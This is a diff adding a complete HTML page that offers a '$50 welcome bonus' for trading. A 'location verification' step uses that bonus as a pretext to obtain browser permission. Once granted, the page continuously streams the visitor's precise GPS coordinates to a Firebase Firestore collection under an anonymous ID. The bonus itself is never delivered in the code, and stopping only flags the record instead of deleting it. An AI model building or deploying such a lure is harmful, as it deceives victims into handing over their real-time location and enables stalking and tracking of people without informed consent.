@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<title>Claim $50</title>
+
+<link
+  rel="stylesheet"
+  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+/>
+
+<style>
+*{
+  box-sizing:border-box;
+}
+
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:
+    radial-gradient(circle at top,#07351d,#02080b 55%,#010304);
+  color:#fff;
+}
+
+.page{
+  max-width:600px;
+  margin:auto;
+  padding:20px;
+}
+
+.hero{
+  text-align:center;
+  padding:25px 15px;
+}
+
+.gift{
+  font-size:70px;
+  filter:drop-shadow(0 0 20px #00ff44);
+}
+
+.title{
+  font-size:58px;
+  font-weight:1000;
+  line-height:.9;
+  margin-top:10px;
+}
+
+.amount{
+  display:block;
+  color:#39ff3d;
+  font-size:90px;
+  text-shadow:0 0 30px #00ff33;
+}
+
+.welcome{
+  margin-top:20px;
+  font-size:25px;
+  font-weight:900;
+}
+
+.green{
+  color:#32ff40;
+}
+
+.description{
+  color:#d8e0dc;
+  line-height:1.6;
+  margin:18px auto;
+  max-width:480px;
+}
+
+.features{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:8px;
+  margin:25px 0;
+}
+
+.feature-icon{
+  width:55px;
+  height:55px;
+  margin:auto;
+  border:2px solid #2cff43;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#32ff45;
+  font-size:25px;
+  box-shadow:0 0 15px rgba(0,255,60,.4);
+}
+
+.feature strong{
+  display:block;
+  color:#35ff45;
+  margin-top:7px;
+}
+
+.feature small{
+  color:#ddd;
+}
+
+.claim{
+  width:100%;
+  padding:19px;
+  border:0;
+  border-radius:20px;
+  background:linear-gradient(90deg,#1dff32,#79ff55,#1dff32);
+  color:#021006;
+  font-size:23px;
+  font-weight:1000;
+  cursor:pointer;
+  box-shadow:0 0 25px rgba(0,255,50,.45);
+}
+
+.offer{
+  margin:18px 0;
+  color:#aab5af;
+}
+
+.verify{
+  display:none;
+  margin-top:25px;
+  padding:22px;
+  border-radius:20px;
+  background:#0b1513;
+  border:1px solid rgba(50,255,70,.35);
+}
+
+.verify.show{
+  display:block;
+}
+
+.verify h2{
+  color:#3cff4c;
+  text-align:center;
+}
+
+.verify p{
+  color:#cbd5d0;
+  line-height:1.5;
+  text-align:center;
+}
+
+.location-btn{
+  width:100%;
+  padding:16px;
+  border:0;
+  border-radius:14px;
+  background:#2789ff;
+  color:#fff;
+  font-size:17px;
+  font-weight:800;
+  cursor:pointer;
+}
+
+.stop-btn{
+  width:100%;
+  margin-top:10px;
+  padding:13px;
+  border:1px solid #ff5555;
+  border-radius:12px;
+  background:transparent;
+  color:#ff7777;
+  font-weight:700;
+  cursor:pointer;
+}
+
+.status{
+  margin-top:15px;
+  padding:13px;
+  border-radius:12px;
+  background:#06100e;
+  text-align:center;
+  color:#bdc9c3;
+}
+
+.success{
+  color:#45ff58;
+}
+
+.error{
+  color:#ff7070;
+}
+
+.data{
+  display:none;
+  margin-top:18px;
+}
+
+.data.show{
+  display:block;
+}
+
+.row{
+  display:flex;
+  justify-content:space-between;
+  padding:12px 0;
+  border-bottom:1px solid rgba(255,255,255,.08);
+}
+
+.label{
+  color:#8e9b95;
+}
+
+.value{
+  font-weight:bold;
+}
+
+#map{
+  height:320px;
+  margin-top:18px;
+  border-radius:15px;
+  overflow:hidden;
+}
+
+.footer{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px;
+  margin-top:25px;
+  padding:20px 5px;
+  border-top:1px solid rgba(255,255,255,.1);
+}
+
+.footer div{
+  text-align:center;
+  color:#c7d0cc;
+  font-size:12px;
+}
+
+.footer b{
+  display:block;
+  color:#32ff45;
+  font-size:25px;
+  margin-bottom:5px;
+}
+
+.notice{
+  color:#7e8b85;
+  font-size:11px;
+  text-align:center;
+  line-height:1.5;
+  margin-top:15px;
+}
+
+@media(max-width:420px){
+  .title{font-size:48px}
+  .amount{font-size:75px}
+  .welcome{font-size:21px}
+  .features{gap:4px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+<section class="hero">
+
+  <div class="gift">🎁</div>
+
+  <div class="title">
+    CLAIM
+    <span class="amount">$50</span>
+  </div>
+
+  <div class="welcome">
+    WELCOME BONUS
+    <span class="green">JUST FOR YOU!</span>
+  </div>
+
+  <div class="description">
+    Start your journey today and check your eligibility
+    for the <span class="green">$50 offer</span>.
+  </div>
+
+  <div class="features">
+
+    <div>
+      <div class="feature-icon">$</div>
+      <strong>$50</strong>
+      <small>Offer</small>
+    </div>
+
+    <div>
+      <div class="feature-icon">⚡</div>
+      <strong>Fast</strong>
+      <small>Setup</small>
+    </div>
+
+    <div>
+      <div class="feature-icon">📈</div>
+      <strong>Trade</strong>
+      <small>& Grow</small>
+    </div>
+
+    <div>
+      <div class="feature-icon">✓</div>
+      <strong>Secure</strong>
+      <small>Access</small>
+    </div>
+
+  </div>
+
+  <button id="claimBtn" class="claim">
+    🎁 &nbsp; CLAIM $50 NOW &nbsp; →
+  </button>
+
+  <div class="offer">
+    Limited Time Offer • Check Eligibility
+  </div>
+
+
+  <!-- LOCATION VERIFICATION -->
+
+  <div id="verify" class="verify">
+
+    <h2>📍 Location Verification</h2>
+
+    <p>
+      To continue, you may share your current device
+      location. Your browser will ask for permission
+      before location data is accessed.
+    </p>
+
+    <button id="locationBtn" class="location-btn">
+      📍 Share My Location
+    </button>
+
+    <button id="stopBtn" class="stop-btn">
+      Stop Sharing
+    </button>
+
+    <div id="status" class="status">
+      Location sharing has not started.
+    </div>
+
+
+    <div id="data" class="data">
+
+      <div class="row">
+        <span class="label">Latitude</span>
+        <span id="lat" class="value">-</span>
+      </div>
+
+      <div class="row">
+        <span class="label">Longitude</span>
+        <span id="lng" class="value">-</span>
+      </div>
+
+      <div class="row">
+        <span class="label">Accuracy</span>
+        <span id="accuracy" class="value">-</span>
+      </div>
+
+      <div class="row">
+        <span class="label">Last Update</span>
+        <span id="updated" class="value">-</span>
+      </div>
+
+      <div id="map"></div>
+
+    </div>
+
+  </div>
+
+
+  <div class="footer">
+
+    <div>
+      <b>🛡</b>
+      Secure
+    </div>
+
+    <div>
+      <b>🌐</b>
+      Global Access
+    </div>
+
+    <div>
+      <b>⚡</b>
+      Fast Setup
+    </div>
+
+  </div>
+
+  <div class="notice">
+    Location sharing requires your explicit browser permission.
+    You can stop sharing at any time.
+  </div>
+
+</section>
+
+</div>
+
+
+<script type="module">
+
+/* ============================================
+   FIREBASE
+============================================ */
+
+import {
+  initializeApp
+} from
+"https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+
+import {
+  getAuth,
+  signInAnonymously
+} from
+"https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js";
+
+import {
+  getFirestore,
+  doc,
+  setDoc,
+  deleteDoc,
+  serverTimestamp
+} from
+"https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+
+
+/* ============================================
+   REPLACE THIS CONFIG
+============================================ */
+
+const firebaseConfig = {
+
+  apiKey:
+    "YOUR_API_KEY",
+
+  authDomain:
+    "YOUR_PROJECT.firebaseapp.com",
+
+  projectId:
+    "YOUR_PROJECT_ID",
+
+  storageBucket:
+    "YOUR_PROJECT.firebasestorage.app",
+
+  messagingSenderId:
+    "YOUR_SENDER_ID",
+
+  appId:
+    "YOUR_APP_ID"
+
+};
+
+
+/* ============================================
+   FIREBASE START
+============================================ */
+
+const app =
+  initializeApp(firebaseConfig);
+
+const auth =
+  getAuth(app);
+
+const db =
+  getFirestore(app);
+
+
+/* ============================================
+   VARIABLES
+============================================ */
+
+let currentUser = null;
+let watchId = null;
+
+let map = null;
+let marker = null;
+
+
+/* ============================================
+   AUTHENTICATE USER
+============================================ */
+
+try {
+
+  const credential =
+    await signInAnonymously(auth);
+
+  currentUser =
+    credential.user;
+
+}
+catch(error){
+
+  console.error(error);
+
+  document.getElementById("status")
+    .textContent =
+    "Firebase connection failed.";
+
+}
+
+
+/* ============================================
+   UI
+============================================ */
+
+const claimBtn =
+  document.getElementById("claimBtn");
+
+const verify =
+  document.getElementById("verify");
+
+const locationBtn =
+  document.getElementById("locationBtn");
+
+const stopBtn =
+  document.getElementById("stopBtn");
+
+const statusBox =
+  document.getElementById("status");
+
+
+claimBtn.onclick = function(){
+
+  verify.classList.add("show");
+
+  verify.scrollIntoView({
+    behavior:"smooth",
+    block:"center"
+  });
+
+};
+
+
+/* ============================================
+   START LOCATION
+============================================ */
+
+locationBtn.onclick = function(){
+
+  if(!currentUser){
+
+    statusBox.textContent =
+      "Connecting to server...";
+
+    return;
+  }
+
+
+  if(!navigator.geolocation){
+
+    statusBox.textContent =
+      "❌ Location is not supported.";
+
+    statusBox.className =
+      "status error";
+
+    return;
+  }
+
+
+  if(watchId !== null){
+
+    return;
+  }
+
+
+  statusBox.textContent =
+    "⏳ Requesting location permission...";
+
+  statusBox.className =
+    "status";
+
+
+  /*
+     WATCH POSITION
+
+     Location changes are sent to
+     Firestore while sharing is active.
+  */
+
+  watchId =
+    navigator.geolocation.watchPosition(
+
+      async function(position){
+
+        const lat =
+          position.coords.latitude;
+
+        const lng =
+          position.coords.longitude;
+
+        const accuracy =
+          position.coords.accuracy;
+
+
+        /* DISPLAY */
+
+        document.getElementById("lat")
+          .textContent =
+          lat.toFixed(6);
+
+        document.getElementById("lng")
+          .textContent =
+          lng.toFixed(6);
+
+        document.getElementById("accuracy")
+          .textContent =
+          Math.round(accuracy) +
+          " meters";
+
+        document.getElementById("updated")
+          .textContent =
+          new Date().toLocaleString();
+
+        document.getElementById("data")
+          .classList.add("show");
+
+
+        statusBox.textContent =
+          "✅ Location sharing is active.";
+
+        statusBox.className =
+          "status success";
+
+
+        /* ==================================
+           SAVE TO FIRESTORE
+        ================================== */
+
+        try{
+
+          await setDoc(
+
+            doc(
+              db,
+              "locations",
+              currentUser.uid
+            ),
+
+            {
+
+              uid:
+                currentUser.uid,
+
+              latitude:
+                lat,
+
+              longitude:
+                lng,
+
+              accuracy:
+                accuracy,
+
+              sharing:
+                true,
+
+              updatedAt:
+                serverTimestamp()
+
+            },
+
+            {
+              merge:true
+            }
+
+          );
+
+        }
+        catch(error){
+
+          console.error(error);
+
+          statusBox.textContent =
+            "Location found, but database update failed.";
+
+          statusBox.className =
+            "status error";
+
+        }
+
+
+        /* ==================================
+           MAP
+        ================================== */
+
+        if(!map){
+
+          map =
+            L.map("map")
+              .setView(
+                [lat,lng],
+                16
+              );
+
+
+          L.tileLayer(
+            "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
+            {
+              maxZoom:19,
+              attribution:
+                "&copy; OpenStreetMap contributors"
+            }
+          ).addTo(map);
+
+        }
+        else{
+
+          map.setView(
+            [lat,lng],
+            16
+          );
+
+        }
+
+
+        if(!marker){
+
+          marker =
+            L.marker(
+              [lat,lng]
+            )
+            .addTo(map);
+
+        }
+        else{
+
+          marker.setLatLng(
+            [lat,lng]
+          );
+
+        }
+
+
+        marker
+          .bindPopup(
+            "Your shared location"
+          )
+          .openPopup();
+
+
+        setTimeout(
+          () => map.invalidateSize(),
+          300
+        );
+
+      },
+
+
+      function(error){
+
+        if(error.code === 1){
+
+          statusBox.textContent =
+            "❌ Permission denied. Please allow location.";
+
+        }
+        else if(error.code === 2){
+
+          statusBox.textContent =
+            "❌ Location unavailable.";
+
+        }
+        else if(error.code === 3){
+
+          statusBox.textContent =
+            "❌ Location request timed out.";
+
+        }
+        else{
+
+          statusBox.textContent =
+            "❌ Unable to get location.";
+
+        }
+
+        statusBox.className =
+          "status error";
+
+      },
+
+
+      {
+        enableHighAccuracy:true,
+        maximumAge:5000,
+        timeout:15000
+      }
+
+    );
+
+};
+
+
+/* ============================================
+   STOP LOCATION
+============================================ */
+
+stopBtn.onclick = async function(){
+
+  if(watchId !== null){
+
+    navigator.geolocation
+      .clearWatch(watchId);
+
+    watchId = null;
+  }
+
+
+  if(currentUser){
+
+    try{
+
+      await setDoc(
+
+        doc(
+          db,
+          "locations",
+          currentUser.uid
+        ),
+
+        {
+
+          sharing:false,
+
+          updatedAt:
+            serverTimestamp()
+
+        },
+
+        {
+          merge:true
+        }
+
+      );
+
+    }
+    catch(error){
+
+      console.error(error);
+
+    }
+
+  }
+
+
+  statusBox.textContent =
+    "Location sharing stopped.";
+
+  statusBox.className =
+    "status";
+
+
+  locationBtn.disabled =
+    false;
+
+};
+
+</script>
+
+
+<script
+src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
+</script>
+
+</body>
+</html>
